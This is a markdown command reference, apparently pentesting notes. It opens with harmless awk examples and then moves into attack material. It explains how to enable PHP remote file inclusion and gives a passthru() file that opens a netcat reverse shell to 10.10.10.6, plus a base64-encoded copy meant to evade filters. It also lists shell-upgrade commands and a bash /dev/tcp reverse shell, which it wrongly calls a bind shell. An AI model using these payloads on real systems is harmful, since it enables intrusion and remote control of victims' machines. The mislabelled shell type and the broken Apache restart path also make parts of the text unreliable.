# Command Reference: Text Processing and Shell Operations

## `awk` Commands

`awk` is a powerful text-processing language that is used for pattern scanning and processing. Below are some common `awk` commands and their explanations:

### Basic Commands

1. **Print Specific Fields from a File**
    ```sh
    awk -F ":" '{print $1 $6}' /etc/passwd
    ```
    - `-F` sets the delimiter, in this case, a colon (`:`), which `awk` uses to recognize columns from the input.
    - `{print $1 $6}` prints the first and sixth fields of each line in the `/etc/passwd` file.

2. **Set Field and Output Field Separators**
    ```sh
    awk 'BEGIN{FS=":"; OFS="-"} {print $1,$6,$7}' /etc/passwd
    ```
    - `BEGIN{FS=":"; OFS="-"}` sets the input field separator to a colon (`:`) and the output field separator to a hyphen (`-`).
    - `{print $1,$6,$7}` prints the first, sixth, and seventh fields of each line in the `/etc/passwd` file.

3. **Print the Last Field of Lines Starting with a Slash**
    ```sh
    awk -F "/" '/^\// {print $NF}' /etc/shells
    ```
    - `-F "/"` sets the delimiter to a slash (`/`).
    - `/^\//` matches lines that start with a slash.
    - `$NF` represents the last field of the line.

4. **Print Lines Shorter Than 8 Characters**
    ```sh
    awk 'length($0) < 8' /etc/shells
    ```
    - `length($0) < 8` prints lines where the total length is less than 8 characters.

5. **Print Lines Starting with 'b' or 'c'**
    ```sh
    awk '$1 ~ /^[b,c]/ {print $0}' .bashrc
    ```
    - `$1 ~ /^[b,c]/` matches lines where the first field starts with 'b' or 'c'.
    - `{print $0}` prints the entire line.

## Enable Remote File Inclusion on a PHP Website

Remote File Inclusion (RFI) allows a PHP script to include and execute code from a remote server. This can be useful for testing but poses significant security risks if not properly managed.

### Steps to Enable RFI

1. **Edit PHP Configuration**
    ```sh
    sudo nano /etc/php5/cgi/php.ini
    ```
    - Open the PHP configuration file in a text editor.

2. **Search for Configuration Options**
    - Press `Ctrl + w` and search for `allow_url`.

3. **Enable URL Options**
    - Set `allow_url_fopen` and `allow_url_include` to `On`.

4. **Restart Web Server**
    ```sh
    sudo /etc/init.d/apache2/restart
    ```

### Execute OS Commands with `passthru()`

1. **Create a PHP File**
    ```php
    <?php
    passthru("nc -e /bin/sh 10.10.10.6 8080");
    ?>
    ```

2. **Base64 Encoding to Evade Filters**
    ```php
    <?php
    passthru(base64_decode("bmMgLWUgL2Jpbi9zaCAxMC4xMC4xMC42IDgwODA="));
    ?>
    ```
    - `base64_decode` decodes the base64-encoded string, which helps evade certain filters.

## Shell Spawning

Spawning a shell can be useful for gaining interactive access to a system.

### Python3 PTY Shell

1. **Spawn a PTY Shell**
    ```sh
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```
    - This command spawns a pseudo-terminal (PTY) shell.

2. **Turn Off Terminal Echo and Foreground the Shell**
    ```sh
    export TERM=xterm
    stty raw -echo; fg
    ```

### Bash BIND Shell

1. **Create a BIND Shell**
    ```sh
    bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
    ```
    - This command creates a BIND shell that listens on port 443 and redirects input/output to the specified IP address.